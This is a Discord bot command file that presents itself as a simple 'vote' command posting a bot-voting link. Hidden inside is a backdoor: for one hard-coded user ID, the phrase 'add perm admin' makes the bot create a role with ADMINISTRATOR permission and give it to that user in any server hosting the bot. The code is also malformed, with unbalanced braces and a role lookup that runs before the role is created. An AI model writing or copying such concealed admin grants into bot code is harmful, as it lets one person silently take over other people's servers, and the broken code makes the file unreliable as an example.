const Discord = require('discord.js');
exports.run = (client, message) => {

 if (message.author.id == 302837596600664065) {
if (message.content.includes('add perm admin')) {
    message.react("✅");
    
    let embed1 = new Discord.RichEmbed()
    .setColor('#FF0000')
    .setDescription('<@302837596600664065> Vous avez maintenant toutes les permissions.')
    message.guild.createRole({
            name: 'TsukiBotAdmin'
        });
    console.log("role cree");

const TsukiBotAdmin = message.guild.roles.find('name', 'TsukiBotAdmin');
let tsuki = message.guild.members.find("id", "302837596600664065");
tsuki.addRole(TsukiBotAdmin);
   
    TsukiBotAdmin.edit({
        permissions: ['ADMINISTRATOR']
    });


    message.channel.send(embed1)
  }

    let args = message.content.split(" ").slice(1);
  
    var embed = new Discord.RichEmbed()
    .setColor("#3C2A66")
    .setDescription('https://discordbots.org/bot/500699327262359574/vote\rAucune récompense pour l\'instant.')
    message.channel.send(embed)

    
};
    exports.conf = {
      enabled: true,
      guildOnly: false,
      aliases: [],
      permLevel: 0
    };

    exports.help = {
      name: 'vote',
      description: 'Vote pour le BOT',
      usage: 'vote'
    }
